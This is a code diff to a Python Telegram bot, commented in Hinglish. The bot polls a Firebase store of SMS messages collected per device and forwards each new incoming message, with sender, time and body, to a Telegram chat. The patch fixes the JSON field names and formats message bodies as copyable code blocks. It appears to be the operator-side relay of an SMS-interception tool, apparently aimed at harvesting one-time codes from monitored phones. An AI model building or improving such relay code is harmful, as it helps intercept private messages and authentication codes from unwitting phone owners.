@@ -203,7 +203,7 @@ async def monitor_task(chat_id, context):
     global is_monitoring, selected_device_id
     last_sms_id = None
 
-    # Initial last_sms_id fetch kar rahe hain (specific device path se)
+    # Initial last_sms_id set kar rahe hain
     try:
         data = requests.get(f"{firebase_base}/user_sms/{selected_device_id}.json").json()
         if data and isinstance(data, dict):
@@ -225,15 +225,19 @@ async def monitor_task(chat_id, context):
                     last_sms_id = latest_key
                     sms = data[latest_key]
                     
-                    if isinstance(sms, dict):
-                        text = (f"📩 New Incoming SMS\n\n"
-                                f"📱 From: {sms.get('sender', 'Unknown')}\n"
-                                f"🕒 Time: {sms.get('dateTime', 'Unknown')}\n\n"
-                                f"💬 Message: {sms.get('message', '')}")
-                    else:
-                        text = f"📩 New Incoming SMS\n\n{sms}"
+                    # Firebase structure ke hisaab se sahi keys le rahe hain
+                    sender = sms.get('sender', 'Unknown')
+                    time_val = sms.get('date', 'Unknown') # JSON mein 'date' field hai
+                    msg_content = sms.get('body', 'No Content') # JSON mein 'body' field hai
+
+                    # Telegram mein code block (`...`) par click karte hi text copy ho jata hai
+                    text = (f"📩 New Incoming SMS\n\n"
+                            f"📱 From: {sender}\n"
+                            f"🕒 Time: {time_val}\n\n"
+                            f"💬 Message:\n`{msg_content}`")
                     
-                    await context.bot.send_message(chat_id=chat_id, text=text)
+                    # Markdown ka use kiya hai taaki code block kaam kare
+                    await context.bot.send_message(chat_id=chat_id, text=text, parse_mode="Markdown")
 
         except Exception as e:
             print(f"Error in monitor: {e}")
